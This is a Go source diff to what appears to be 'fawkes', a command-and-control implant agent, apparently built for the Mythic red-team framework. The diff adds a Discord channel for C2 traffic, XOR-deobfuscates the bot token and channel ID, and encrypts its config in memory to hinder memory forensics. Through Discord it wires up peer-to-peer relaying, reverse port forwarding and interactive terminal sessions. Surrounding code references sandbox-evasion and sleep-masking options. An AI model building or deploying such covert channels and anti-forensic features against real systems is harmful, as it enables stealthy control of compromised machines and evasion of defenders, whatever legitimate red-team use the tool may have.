@@ -22,6 +22,7 @@ import (
 	"github.com/google/uuid"
 
 	"fawkes/pkg/commands"
+	"fawkes/pkg/discord"
 	"fawkes/pkg/files"
 	"fawkes/pkg/http"
 	"fawkes/pkg/profiles"
@@ -67,6 +68,10 @@ var (
 	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
 	sandboxGuard      string = ""     // Detect sleep skipping (sandbox fast-forward) and exit silently
 	sleepMask         string = ""     // Encrypt sensitive agent/C2 data in memory during sleep cycles
+	discordBotToken   string = ""     // Discord bot token for Discord C2 profile
+	discordChannelID  string = ""     // Discord channel ID for Discord C2 profile
+	discordPollDelay  string = ""     // Seconds between Discord message polls (default: 10)
+	discordPollChecks string = ""     // Max polling attempts per exchange (default: 10)
 )
 
 func main() {
@@ -95,6 +100,8 @@ func runAgent() {
 			proxyURL = xorDecodeString(proxyURL, keyBytes)
 			customHeaders = xorDecodeString(customHeaders, keyBytes)
 			fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
+			discordBotToken = xorDecodeString(discordBotToken, keyBytes)
+			discordChannelID = xorDecodeString(discordChannelID, keyBytes)
 			// Zero the XOR key — no longer needed after deobfuscation
 			zeroBytes(keyBytes)
 		}
@@ -233,6 +240,69 @@ func runAgent() {
 		c2 = profiles.NewTCPProfile(tcpProfile)
 		// Make TCP profile available to link/unlink commands
 		commands.SetTCPProfile(tcpProfile)
+	} else if discordBotToken != "" {
+		// Discord C2 mode — communicate through a Discord channel
+		log.Printf("discord c2")
+
+		// Parse Discord-specific poll parameters
+		pollDelay := 10
+		if discordPollDelay != "" {
+			if v, err := strconv.Atoi(discordPollDelay); err == nil && v > 0 {
+				pollDelay = v
+			}
+		}
+		pollChecks := 10
+		if discordPollChecks != "" {
+			if v, err := strconv.Atoi(discordPollChecks); err == nil && v > 0 {
+				pollChecks = v
+			}
+		}
+
+		discordProfile := discord.NewDiscordProfile(
+			discordBotToken,
+			discordChannelID,
+			encryptionKey,
+			sleepIntervalInt,
+			jitterInt,
+			pollChecks,
+			pollDelay,
+			debugBool,
+			userAgent,
+			proxyURL,
+		)
+		c2 = profiles.NewDiscordProfile(discordProfile)
+
+		// Seal the Discord config vault — encrypts bot token, channel ID, and
+		// encryption key with AES-256-GCM to reduce memory forensics exposure.
+		if err := discordProfile.SealConfig(); err != nil {
+			log.Printf("seal failed: %v", err)
+		}
+
+		// TCP P2P child management (Discord egress agents can also link to TCP children)
+		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
+		commands.SetTCPProfile(tcpP2P)
+
+		// Wire up delegate hooks for P2P routing through Discord
+		discordProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
+			return tcpP2P.DrainDelegatesOnly()
+		}
+		discordProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
+			return tcpP2P.DrainDelegatesAndEdges()
+		}
+		discordProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
+			tcpP2P.RouteToChildren(delegates)
+		}
+
+		// Wire up rpfwd hooks for reverse port forwarding
+		rpfwdManager := rpfwd.NewManager()
+		defer rpfwdManager.Close()
+		commands.SetRpfwdManager(rpfwdManager)
+		discordProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
+		discordProfile.HandleRpfwd = rpfwdManager.HandleMessages
+
+		// Wire up interactive hooks for PTY/terminal bidirectional streaming
+		discordProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
+		discordProfile.HandleInteractive = commands.RouteInteractiveInput
 	} else {
 		// HTTP egress mode (default)
 		var callbackURL string
@@ -814,6 +884,10 @@ func clearGlobals() {
 	tlsFingerprint = ""
 	fallbackHosts = ""
 	tcpBindAddress = ""
+	discordBotToken = ""
+	discordChannelID = ""
+	discordPollDelay = ""
+	discordPollChecks = ""
 
 	// Operational parameters
 	sleepInterval = ""
